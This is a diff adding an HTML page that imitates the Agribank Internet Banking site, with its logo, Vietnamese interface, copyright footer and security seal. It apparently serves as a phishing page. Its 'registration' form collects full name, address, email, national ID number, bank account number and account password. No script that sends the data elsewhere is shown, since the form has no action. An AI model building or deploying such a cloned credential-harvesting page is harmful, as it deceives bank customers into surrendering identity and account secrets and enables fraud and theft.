@@ -1,0 +1,189 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <meta http-equiv="cache-control" content="max-age=0" />
+    <meta http-equiv="cache-control" content="no-cache" />
+    <meta http-equiv="expires" content="-1" />
+    <meta http-equiv="pragma" content="no-cache" />
+    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" type="text/css" href="css/mainstyle.css">
+    <link rel="stylesheet" type="text/css" href="css/reponsive.css">
+    <script type="text/javascript" src="js/pure.js"></script>
+    <!-- <script type="text/javascript">
+function image(img) {
+    window.open("http://webchat.agribank.com.vn/Code/webchatLogin.php");
+}
+</script> -->
+    <script>
+        var browser = navigator.appName;
+        var version = get_browser_version();
+
+        if (browser == "Microsoft Internet Explorer") {
+            if (version <= "9.0") {
+                var r = window.confirm("Trình duyệt của quý khách đã lỗi thời, vui lòng nâng cấp lên phiên bản mới hơn để sử dụng hệ thống");
+                if (r == true)
+                    document.location.href = "https://windows.microsoft.com/vi-vn/internet-explorer/download-ie";
+                else
+                    document.location.href = "https://agribank.com.vn";
+            }
+        }
+    </script>
+    <title>Agribank Internet Banking | Home Page</title>
+</head>
+
+<body>
+
+    <div class="header">
+        <div class="wrapper">
+            <div class="logo">
+                <a title="Agribank" href="/signin"><img src="img/logo_agribank.png" /></a>
+            </div>
+            <!--end .logo-->
+            <br class="clear">
+        </div>
+    </div>
+    <!--end .header-->
+
+    <div class="section">
+        <div class="wrapper">
+
+        </div>
+    </div>
+    <!--end .section-->
+
+    <div class="content">
+        <div class="wrapper">
+
+            <div class="aside">
+                <ul id="browser" class="navAside">
+
+                    <li class="closed"><a href="/signin">Trang chủ</a></li>
+                    <li class="closed"><a href="/giaodich">Giao dịch</a></li>
+                    <li class="closed"><a href="#">Liên hệ</a></li>
+                </ul>
+            </div>
+            <!--end .aside-->
+
+
+            <div class="mainContent">
+                <h2 class="title_art">Đăng kí dịch vụ<span class="sp_pow"></span></h2>
+                <div class="mod_reg">
+                    <div class="wrap_reg">
+                        <div class="mReg left_mReg">
+
+
+
+
+
+
+                            <form>
+                                <label>Họ và Tên</label>
+                                <div class="row_input">
+                                    <input type="text" name="userName" value="" id="inter" autocomplete="off" required> <img src="img/i-keyboard.png" id="inter-type" class="tooltip-jatt imgKey" title="Nhập bằng bàn phím ảo">
+                                </div>
+                                <label>Địa Chỉ</label>
+                                <div class="row_input">
+                                    <input type="text" name="userAddress" value="" id="inter1" autocomplete="off" required> <img src="img/i-keyboard.png" id="inter-type" class="tooltip-jatt imgKey" title="Nhập bằng bàn phím ảo">
+                                </div>
+                                <label>Email</label>
+                                <div class="row_input">
+                                    <input type="text" name="userEmail" value="" id="inter2" autocomplete="off" required> <img src="img/i-keyboard.png" id="inter-type" class="tooltip-jatt imgKey" title="Nhập bằng bàn phím ảo">
+                                </div>
+                                <label>Số CMT</label>
+                                <div class="row_input">
+                                    <input type="text" name="userCmt" value="" id="inter3" autocomplete="off" required> <img src="img/i-keyboard.png" id="inter-type" class="tooltip-jatt imgKey" title="Nhập bằng bàn phím ảo">
+                                </div>
+                                <label>Số tài Khoản</label>
+                                <div class="row_input">
+                                    <input type="text" name="userStk" value="" id="inter4" autocomplete="off" required> <img src="img/i-keyboard.png" id="inter-type" class="tooltip-jatt imgKey" title="Nhập bằng bàn phím ảo">
+                                </div>
+                                <label>Mật Khẩu</label>
+                                <div class="row_input">
+                                    <input type="password" name="userPass" value="" id="inter5" autocomplete="off" required> <img src="img/i-keyboard.png" id="inter1-type" class="tooltip-jatt imgKey" title="Nhập bằng bàn phím ảo">
+                                </div>
+
+                                <div class="row_btn">
+                                    <button type="submit" name="doOK" id="doOK" value="đăng ki">Đăng Kí</button>
+                                    <input name="currentPage" type="hidden" class="textControl" id="currentPage" value="./" /> <input name="clientID" type="hidden" id="clientID" value="null" />
+                                </div>
+
+
+
+                            </form>
+
+                        </div>
+                        <!--end .left_mReg-->
+
+                        <div class="mReg right_mReg">
+                            <div class="helpSer">
+                                <h3>Công cụ</h3>
+                                <ul>
+                                    <!-- <li><a href="tcbaolanh.jsp" style="color:#AF1E40 !important;">Tra cứu bảo lãnh</a></li>  -->
+                                    <!-- <li><a href="tcbaolanh.jsp">Tra cứu bảo lãnh</a></li> -->
+                                    <li><a href="#">Tra cứu bảo lãnh</a></li>
+                                    <!-- <li><a href="otp_orders.jsp" style="color:#AF1E40 !important;font-size: 15px;font-family: Helvetica, sans-serif !important;font-weight: bold;">Đăng ký chuyển đổi số điện thoại nhận SMS OTP từ 11 số sang 10 số</a></li> -->
+                                </ul>
+                            </div>
+                            <div class="helpSer">
+                                <h3>Trợ giúp</h3>
+                                <ul>
+                                    <li><a href="./CanhBaoGiaoDichGiaMaoDichVuNganHangDienTu.pdf" style="color:#AF1E40 !important;font-size: 20px;font-family: Helvetica, sans-serif !important;">Khuyến Cáo Bảo Mật Thông Tin</a></li>
+                                    <li><a href="./Agr_clearCache.doc" style="color:#AF1E40 !important;">Xóa cache trên web browser</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                        <!--end .right_mReg-->
+                        <br class="clear">
+                    </div>
+                </div>
+            </div>
+            <!--end .mainContent-->
+            <br class="clear">
+
+        </div>
+    </div>
+    <!--end .content-->
+
+    <div class="footer">
+        <div class="wrapper">
+            <div class="r_footer">
+                <table width="135" border="0" cellpadding="2" cellspacing="0" title="Click to Verify - This site chose Symantec SSL for secure e-commerce and confidential communications.">
+                    <tr>
+                        <!-- <td><a onclick="image(this)" id="img"><img src="./hotline-circle.png" id="imgp" alt="networkTest"></img></a></td> -->
+                        <td width="135" align="center" valign="top">
+                            <script type="text/javascript" src="https://seal.websecurity.norton.com/getseal?host_name=ibank.agribank.com.vn&amp;size=S&amp;use_flash=YES&amp;use_transparent=YES&amp;lang=en"></script><br />
+                            <a href="https://www.symantec.com/ssl-certificates" target="_blank" style="color:#000000; text-decoration:none; font:bold 7px verdana,sans-serif; letter-spacing:.5px; text-align:center; margin:0px; padding:0px;">ABOUT SSL CERTIFICATES</a></td>
+                    </tr>
+                </table>
+            </div>
+            <div class="contFooter">
+                <p>&copy; 2009 - 2019 Bản quyền thuộc về</p>
+                <p>Ngân hàng Nông nghiệp và Phát triển Nông thôn Việt Nam</p>
+            </div>
+            <br class="clear">
+        </div>
+    </div>
+    <!--end .footer-->
+
+</body>
+<script type="text/javascript">
+    (function(i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r;
+        i[r] = i[r] || function() {
+            (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date();
+        a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+        a.async = 1;
+        a.src = g;
+        m.parentNode.insertBefore(a, m)
+    })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
+    ga('create', 'UA-72017488-1', 'auto');
+    ga('send', 'pageview');
+</script>
+
+</html>
